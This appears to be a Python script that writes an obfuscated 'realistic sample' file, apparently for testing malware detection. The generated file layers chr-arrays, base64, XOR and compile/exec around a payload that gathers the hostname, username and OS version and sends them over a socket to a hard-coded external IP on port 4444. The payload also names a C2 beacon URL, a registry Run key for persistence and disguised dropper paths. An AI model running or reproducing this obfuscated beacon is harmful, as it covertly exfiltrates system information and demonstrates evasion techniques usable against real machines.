import base64
xored = bytes((ord(c) ^ 42 for c in 'import platform, socket\nimport os\n\n_host    = socket.gethostname()\n_user    = __import__("os").environ.get("USERNAME", __import__("os").environ.get("USER", "unknown"))\n_os_ver  = platform.platform()\n\n_c2_host     = "185.220.101.47"\n_c2_port     = 4444\n_beacon_url  = "http://185.220.101.47:8080/gate.php"\n_reg_key     = "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"\n_dropper_win = "C:\\\\Users\\\\Public\\\\WindowsUpdate32.exe"\n_dropper_nix = "/tmp/.systemd-private-cache"\n\n_info = f"[beacon] host={_host} user={_user} os={_os_ver}"\n\ntry:\n    _s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    _s.settimeout(0.01)\n    _s.connect((_c2_host, _c2_port))\n    _s.sendall(_info.encode())\n    _s.close()\nexcept Exception:\n    pass\n\nimport os as _os\n_os.system("echo " + _info)\n'))
b64 = base64.b64encode(xored).decode()
chr_decode = list((ord(c) for c in 'decode'))
chr_latin = list((ord(c) for c in 'latin-1'))
sample = f"# layers: chr-array, __import__, base64, XOR lambda, compile+exec\n\n_dec_fn  = ''.join(map(chr, {chr_decode}))\n_enc_fn  = ''.join(map(chr, {chr_latin}))\n\nimport base64 as _b64\n_raw  = _b64.b64decode({b64!r})\n_xor  = lambda s: ''.join(chr(ord(c) ^ {42}) for c in s)\n_src  = _xor(getattr(_raw, _dec_fn)(_enc_fn))\n_code = compile(_src, '<payload>', 'exec')\nexec(_code)\n"
with open('samples/sample_realistic.py', 'w') as f:
    f.write(sample)
print('Written samples/sample_realistic.py')
print()
print(sample)